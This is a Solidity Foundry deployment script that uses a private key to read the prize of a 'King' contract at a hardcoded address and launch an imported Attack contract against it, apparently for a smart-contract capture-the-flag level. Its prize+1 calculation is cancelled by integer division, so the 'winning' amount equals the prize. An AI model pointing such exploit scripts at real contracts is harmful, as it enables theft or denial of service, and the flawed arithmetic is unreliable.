// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import {Script} from "forge-std/Script.sol";
import {Attack} from "../src/Attack.sol";

interface IKing {
    function prize() external returns (uint256);

    function owner() external returns (address);

    function _king() external view returns (address);
}

contract DeployAttack is Script {
    function run() external returns (Attack) {
        IKing king;
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        uint256 prize;
        uint256 winningPrize;
        uint256 scalingFactor = 1_000_000;

        // Create an instance of king contract
        vm.startBroadcast(privateKey);
        king = IKing(0x222F09c24Ffc9aA170d2A3cBA6B5D79a835E09Af);
        vm.stopBroadcast();

        // Retrieve the current prize
        vm.startBroadcast(privateKey);
        prize = king.prize();
        vm.stopBroadcast();

        // Calculate winning prize to send
        uint256 prizeInWei = prize * scalingFactor;
        winningPrize = prizeInWei + 1;

        vm.startBroadcast(privateKey);
        Attack attack = new Attack{value: winningPrize / scalingFactor}(
            0x222F09c24Ffc9aA170d2A3cBA6B5D79a835E09Af
        );
        vm.stopBroadcast();

        return (attack);
    }
}
